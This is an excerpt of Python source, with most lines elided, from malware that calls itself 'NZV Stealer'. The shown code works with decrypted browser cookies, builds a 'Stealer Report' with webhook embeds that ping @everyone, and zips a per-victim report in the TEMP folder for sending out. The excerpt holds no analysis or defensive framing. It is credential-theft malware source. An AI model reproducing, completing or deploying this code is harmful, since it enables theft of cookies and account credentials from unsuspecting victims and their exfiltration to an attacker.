    ...
    if decrypted_cookie:
        ...
        if match:
            ...
            if info:
                ...
                gh = "https://github.com/c7s89r"
                payload = {
                    "embeds": [{
                        "username": "NZV Stealer",
...
class NZVRecovery:
    ...
    def rep_send(self):
        try:
            ...
            _zn = f"NZV_Report_{self.user}.zip"; _zp = os.path.join(os.getenv("TEMP"), _zn)
            ...
            _main_emb = {"title": "<a:12705eyes:1505917648507109508> NZV Stealer Report", "url": gh, "color": 0x00A3FF, "thumbnail": {"url": "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"}, "fields": _fields, "footer": {"text": f"NZV Tools | {gh}", "icon_url": "https://i.ibb.co/Wv94YGVx/nzv.png"}, "timestamp": datetime.now(timezone.utc).isoformat()}
            _embeds = [_main_emb]
            ...
            _pj = {"content": "@everyone" if _SET["ping"] else "", "embeds": _embeds, "username": "NZV Stealer", "avatar_url": "https://i.ibb.co/0R0MPTwz/avatars-000615381687-t475ap-t240x240-removebg-preview.png"}
